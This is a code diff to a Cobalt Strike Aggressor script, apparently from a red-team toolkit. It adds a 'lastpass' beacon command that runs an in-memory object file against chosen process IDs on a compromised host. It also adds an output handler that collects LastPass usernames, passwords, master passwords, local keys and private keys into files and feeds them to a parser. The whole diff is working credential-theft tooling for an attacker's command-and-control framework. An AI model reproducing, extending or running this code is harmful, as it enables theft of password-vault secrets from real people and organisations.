@@ -24,6 +24,8 @@ REG_QWORD => 11
     REG_QWORD => 1
 );
 
+$id_lastpass = "LASTPASS>>";
+
 ########################################
 # Helper functions
 ########################################
@@ -462,6 +464,80 @@ Usage:   sc_start <SVCNAME> <OPT:HOSTNAME>
                   local system is targeted if a HOSTNAME is not specified.
 "
 );
+
+on beacon_output
+{
+    local('$beacon $message $id $output $parsed_return_file @cmd $ret $lp_files $parser $returned_len $returned_len $fp')
+   
+    $beacon = $1;
+    $message = $2;
+    if (strlen($message) > 26) {
+        $message = substr($message, 17);
+        $id = left($message, 10);
+
+        if ($id eq $id_lastpass){
+			@pid = unpack("I",substr($message,0xc,0x10));
+			@type_int = unpack("I",substr($message, 0x10, 0x14));
+			@buf_sz = unpack("I",substr($message, 0x14, 0x18));
+
+			$type = "";
+			if (@type_int[0] == 0){
+				$type = "JSON";
+			}else if (@type_int[0] == 1){
+				$type = "PWD_MEM_OBJECT";
+			}else if (@type_int[0] == 2){
+				$type = "AID";
+			}else if (@type_int[0] == 3){
+				$type = "NAME";
+			}else if (@type_int[0] == 4){
+				$type = "USERNAME";
+			}else if (@type_int[0] == 5){
+				$type = "PASSWORD";
+			}else if (@type_int[0] == 6){
+				$type = "G_LOCAL_KEY";
+			}else if (@type_int[0] == 7){
+				$type = "LOCAL_KEY";
+			}else if (@type_int[0] == 8){
+				$type = "MASTER_PASSWORD";
+			}else if (@type_int[0] == 9){
+				$type = "USER_CONFIG";
+			}else if (@type_int[0] == 10){
+				$type = "PRIV_KEY";
+			}
+
+			if (@type_int[0] == 100)
+			{
+				$parser = script_resource("lastpass/process_lp_files.py");
+				$lp_files = script_resource("lastpass");
+				$parsed_return_file = script_resource("lastpass/out.txt");
+				@cmd = @("python3",$parser, $lp_files);
+				$ret = exec( @cmd );
+				sleep(1 * 1000);
+				blog($beacon, "exec ret: ". readAll($ret). "\n");
+				if(-exists $parsed_return_file) {
+					$returned_len = lof($parsed_return_file);
+					$fp = openf($parsed_return_file);
+					$output = readb($fp, $returned_len);
+					closef($fp);
+					deleteFile($parsed_return_file);
+					blog($beacon, "LastPass return value: \n" . $output);
+				}else{
+					println("Exec failed");
+					blog($beacon, "Exec failed");
+				}	
+			} else {
+				$lp_filename = script_resource("lastpass/lp_".@pid[0]."_".$type.".txt");
+				$handle = openf(">>".$lp_filename);
+				print($handle, "<MSG>");
+				print($handle, substr($message,0x18));
+				println($handle, "</MSG>");
+				closef($handle);
+			}	
+
+        }
+    }
+}
+
 
 ########################################
 # Registry commands
@@ -1383,4 +1459,40 @@ beacon_command_register(
 	"Command: office_tokens
 
 Usage: office_tokens <pid> "
+);
+
+alias lastpass
+{
+	local('$pid $args $value $i $buffer $arg_sz');
+	$arg_sz = size(@_);
+	if(size(@_) < 2)
+	{
+		berror($1, "usage: lastpass <pid1> <pid2> <pid3> .. <pidn>");
+		return;
+	}
+
+    $buffer = allocate(0);
+
+	for( $i = 1; $i < $arg_sz; $i++)
+	{
+        bwrite($buffer, "i", @_[$i]);
+	}
+    bwrite($buffer, "i", 0); # null terminator at the end
+    closef($buffer);
+    $value = readb($buffer, -1);
+
+	$arg_sz = $arg_sz - 1;
+
+	berror($1, $arg_sz);
+	$args = bof_pack($1, "ib", $arg_sz, $value);
+	beacon_inline_execute($1, readbof($1, "lastpass"), "go", $args);
+	berror($1, "FINISHED");
+}
+
+beacon_command_register(
+	"lastpass",
+	"Searches memory for LastPass passwords and hashes",
+	"Command: lastpass 
+
+Usage: lastpass <number of pids> <pid>,<pid>,<pid> ... "
 );
